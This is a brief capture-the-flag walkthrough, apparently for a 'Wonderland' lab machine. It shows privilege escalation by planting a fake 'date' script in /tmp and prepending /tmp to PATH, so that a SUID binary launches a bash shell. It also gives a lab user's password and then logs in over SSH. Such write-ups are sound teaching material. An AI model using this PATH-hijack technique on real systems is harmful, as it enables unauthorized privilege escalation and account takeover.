download the teaParty file `python3 -m http.server` `wget 10.10.24.255:8000/teaParty`  
decompile the file with ghidra  
see that it calls the date library which is stored in /usr/bin  
create a file called date in /tmp `#!/bin/bash; /bin/bash` -> this file gets called with the suid bit set --> make the file executable  
write /tmp to the path `export PATH=/tmp:$PATH` so that it is before /usr/bin --> our file gets found and executed before the original date file  
execute the teaparty file and get hatter's credentials `hatter:WhyIsARavenLikeAWritingDesk?`  
ssh in as hatter
